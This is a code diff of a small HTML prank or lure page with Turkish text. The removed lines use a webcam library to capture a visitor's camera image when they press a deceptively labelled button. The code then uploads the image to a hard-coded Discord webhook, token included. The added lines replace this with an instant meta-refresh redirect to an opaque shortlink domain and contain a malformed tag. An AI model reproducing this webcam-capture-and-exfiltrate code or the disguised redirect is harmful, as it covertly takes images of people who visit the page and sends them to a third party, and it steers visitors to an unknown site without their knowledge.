@@ -1,63 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>kendini göster</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0;url=https://pnrtscr.com/kqrkc7link">
+    <title>31</title>
 </head>
 <body>
-    <h1>31313131313</h1>
-    <div id="cameraContainer"></div>
-    <button onclick="takeScreenshot()">boşalmak için donate at</button>
-
-    <script>
-        Webcam.set({
-            width: 640,
-            height: 480,
-            dest_width: 640,
-            dest_height: 480,
-            image_format: 'jpeg',
-            jpeg_quality: 90
-        });
-
-        Webcam.attach('#cameraContainer');
-
-        function takeScreenshot() {
-            Webcam.snap(function (dataUri) {
-                // Create a new image element
-                var img = new Image();
-                img.src = dataUri;
-
-                // Convert the data URI to a Blob
-                var byteString = atob(dataUri.split(',')[1]);
-                var mimeString = dataUri.split(',')[0].split(':')[1].split(';')[0];
-                var ab = new ArrayBuffer(byteString.length);
-                var ia = new Uint8Array(ab);
-                for (var i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
-                }
-                var blob = new Blob([ab], { type: mimeString });
-
-                // Create a FormData object and append the screenshot blob
-                var formData = new FormData();
-                formData.append('file', blob, 'screenshot.jpg');
-
-                // Send the FormData to the Discord webhook using fetch
-                fetch('https://discord.com/api/webhooks/1121844315912675471/VjLDnpl_fcoT-nRlnd3tZRccCGs2WjLLeO58pAV44ahavR2u53DVTaOr_NlMyQM1yjWL', {
-                    method: 'POST',
-                    body: formData
-                })
-                    .then(function (response) {
-                        if (response.ok) {
-                            console.log('Screenshot sent successfully!');
-                        } else {
-                            console.error('Failed to send the screenshot.');
-                        }
-                    })
-                    .catch(function (error) {
-                        console.error('Error sending the screenshot:', error);
-                    });
-            });
-        }
-    </script>
+    <p>patladim</a>.</p>
 </body>
 </html>
